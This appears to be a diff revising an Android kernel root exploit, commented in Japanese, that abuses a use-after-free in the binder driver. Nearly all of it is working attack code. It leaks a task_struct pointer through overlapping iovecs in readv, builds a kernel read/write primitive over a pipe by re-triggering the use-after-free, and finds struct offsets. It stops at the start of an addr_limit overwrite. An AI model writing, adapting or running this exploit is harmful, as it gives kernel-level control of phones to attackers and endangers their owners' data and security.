@@ -37,13 +37,12 @@
 
 #define PAGE_SIZE 4096
 #define IOVEC_COUNT 25
-#define IOVEC_OVERLAP_INDEX 10
+#define OVERLAP_INDEX 10
 #define TASK_STRUCT_SIZE 4096
 
 static int binder_fd;
 static int epoll_fd;
 static int krw_pipe[2];
-static struct epoll_event ev;
 static uint64_t task_struct_kptr = 0;
 static uint64_t cred_kptr = 0;
 static int cred_offset = -1;
@@ -68,17 +67,19 @@ void *mmap_page(unsigned long addr) {
     return mem;
 }
 
-// ========== Step 1: readv で task_struct をリーク（タイムアウト付き） ==========
+// ========== カーネルポインタをリーク（実績ある手法） ==========
 int leak_task_struct(void) {
     int pipefd[2];
-    int offset = IOVEC_OVERLAP_INDEX;
     pid_t cpid;
     struct iovec iovec_stack[IOVEC_COUNT];
     void *aligned_address;
     struct pollfd pfd;
+    ssize_t n;
+    uint64_t *data;
 
-    LOGI("[*] Leaking task_struct via readv (timeout 5s)...");
+    LOGI("[*] Leaking task_struct via readv (known method)");
 
+    // 1. /dev/binder を開く
     binder_fd = open("/dev/binder", O_RDWR);
     if (binder_fd < 0) {
         LOGE("open binder failed: %s", strerror(errno));
@@ -86,30 +87,29 @@ int leak_task_struct(void) {
     }
     LOGI("[+] binder_fd=%d", binder_fd);
 
+    // 2. epoll を作成して binder_fd を監視
     epoll_fd = epoll_create(100);
     if (epoll_fd < 0) {
         LOGE("epoll_create failed: %s", strerror(errno));
         close(binder_fd);
         return -1;
     }
-    LOGI("[+] epoll_fd=%d", epoll_fd);
-
-    aligned_address = mmap_page(0x100000000UL);
-    if (!aligned_address) {
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
+        LOGE("epoll_ctl ADD failed: %s", strerror(errno));
         close(binder_fd);
         close(epoll_fd);
         return -1;
     }
-    LOGI("[+] aligned_address=%p", aligned_address);
+    LOGI("[+] epoll_ctl ADD succeeded");
 
+    // 3. pipe を作成し、バッファサイズを PAGE_SIZE に設定
     if (pipe(pipefd) < 0) {
         LOGE("pipe failed: %s", strerror(errno));
         close(binder_fd);
         close(epoll_fd);
         return -1;
     }
-    LOGI("[+] pipefd[0]=%d, pipefd[1]=%d", pipefd[0], pipefd[1]);
-
     if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
         LOGE("fcntl F_SETPIPE_SZ failed: %s", strerror(errno));
         close(binder_fd);
@@ -119,23 +119,37 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    memset(iovec_stack, 0, sizeof(iovec_stack));
-    iovec_stack[offset].iov_base = aligned_address;
-    iovec_stack[offset].iov_len = PAGE_SIZE;
-    iovec_stack[offset + 1].iov_base = (void *)aligned_address;
-    iovec_stack[offset + 1].iov_len = PAGE_SIZE;
-
-    ev.events = EPOLLIN;
-    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
-        LOGE("epoll_ctl ADD failed: %s", strerror(errno));
+    // 4. パイプにダミーデータを書き込んでバッファを確保（これが重要）
+    char dummy[64] = {0};
+    if (write(pipefd[1], dummy, sizeof(dummy)) != sizeof(dummy)) {
+        LOGE("write dummy to pipe failed");
         close(binder_fd);
         close(epoll_fd);
         close(pipefd[0]);
         close(pipefd[1]);
         return -1;
     }
-    LOGI("[+] epoll_ctl ADD succeeded");
+    LOGI("[+] Pipe dummy write done");
 
+    // 5. 読み取り用のバッファを mmap
+    aligned_address = mmap_page(0x100000000UL);
+    if (!aligned_address) {
+        close(binder_fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+    LOGI("[+] aligned_address=%p", aligned_address);
+
+    // 6. iovec 設定（オーバーラップを利用）
+    memset(iovec_stack, 0, sizeof(iovec_stack));
+    iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
+    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
+    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
+    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
+
+    // 7. fork
     cpid = fork();
     if (cpid < 0) {
         LOGE("fork failed: %s", strerror(errno));
@@ -147,7 +161,7 @@ int leak_task_struct(void) {
     }
 
     if (cpid == 0) {
-        // 子: 少し待ってから BINDER_THREAD_EXIT
+        // 子プロセス: 少し待ってから BINDER_THREAD_EXIT
         usleep(50000);
         LOGI("[child] Calling BINDER_THREAD_EXIT...");
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
@@ -155,10 +169,10 @@ int leak_task_struct(void) {
         _exit(0);
     }
 
-    // 親: poll で pipefd[0] にデータが来るのを待つ（タイムアウト 5 秒）
+    // 8. 親: poll で pipe にデータが来るのを待つ（タイムアウト 3 秒）
     pfd.fd = pipefd[0];
     pfd.events = POLLIN;
-    int poll_ret = poll(&pfd, 1, 5000);
+    int poll_ret = poll(&pfd, 1, 3000);
     if (poll_ret < 0) {
         LOGE("poll failed: %s", strerror(errno));
         close(binder_fd);
@@ -168,7 +182,7 @@ int leak_task_struct(void) {
         return -1;
     }
     if (poll_ret == 0) {
-        LOGI("[!] poll timeout, no data received");
+        LOGI("[!] poll timeout, no data");
         close(binder_fd);
         close(epoll_fd);
         close(pipefd[0]);
@@ -176,7 +190,8 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    ssize_t n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
+    // 9. readv で pipe から読み取り（これで leaked pointer が取得できる）
+    n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
     LOGI("[parent] readv returned %zd", n);
     if (n < 0) {
         LOGE("readv failed: %s", strerror(errno));
@@ -187,8 +202,8 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    // リークした task_struct を探す
-    uint64_t *data = (uint64_t *)aligned_address;
+    // 10. leaked pointer を探す
+    data = (uint64_t *)aligned_address;
     for (int i = 0; i < (PAGE_SIZE / 8); i++) {
         uint64_t val = data[i];
         if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
@@ -214,18 +229,9 @@ int leak_task_struct(void) {
     return 0;
 }
 
-// ========== Step 2: カーネル読み書きプリミティブ（pipe + 再 UAF） ==========
+// ========== カーネル読み書きプリミティブ（pipe + 再 UAF） ==========
 int setup_kernel_rw(void) {
-    int sock_fd[2];
-
     LOGI("[*] Setting up kernel RW via pipe...");
-
-    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) < 0) {
-        LOGE("socketpair failed: %s", strerror(errno));
-        return -1;
-    }
-    close(sock_fd[0]);
-    close(sock_fd[1]);
 
     if (pipe(krw_pipe) < 0) {
         LOGE("krw pipe failed: %s", strerror(errno));
@@ -251,7 +257,7 @@ int setup_kernel_rw(void) {
         return -1;
     }
 
-    ev.events = EPOLLIN;
+    struct epoll_event ev = {.events = EPOLLIN};
     if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
         LOGE("epoll_ctl ADD for RW failed: %s", strerror(errno));
         close(binder_fd);
@@ -259,7 +265,7 @@ int setup_kernel_rw(void) {
         return -1;
     }
 
-    // 再 UAF をトリガーして krw_pipe のバッファを freed 領域に被せる
+    // 再 UAF をトリガー
     pid_t cpid = fork();
     if (cpid < 0) {
         LOGE("fork for RW failed: %s", strerror(errno));
@@ -275,7 +281,7 @@ int setup_kernel_rw(void) {
     struct pollfd pfd;
     pfd.fd = krw_pipe[0];
     pfd.events = POLLIN;
-    int poll_ret = poll(&pfd, 1, 5000);
+    int poll_ret = poll(&pfd, 1, 3000);
     if (poll_ret <= 0) {
         LOGE("poll for krw_pipe failed");
         wait(NULL);
@@ -292,7 +298,7 @@ int setup_kernel_rw(void) {
     return 0;
 }
 
-// ========== Step 3: task_struct ダンプ＋オフセット検出 ==========
+// ========== オフセット自動検出 ==========
 int find_offsets_in_task_struct(void) {
     LOGI("[*] Dumping task_struct to find offsets...");
 
@@ -364,7 +370,7 @@ int find_offsets_in_task_struct(void) {
     return 0;
 }
 
-// ========== Step 4-6 は前回と同じ ==========
+// ========== 以下、前回と同じ ==========
 int overwrite_addr_limit(void) {
     LOGI("[*] Overwriting addr_limit...");
     uint64_t addr = task_struct_kptr + addr_limit_offset;
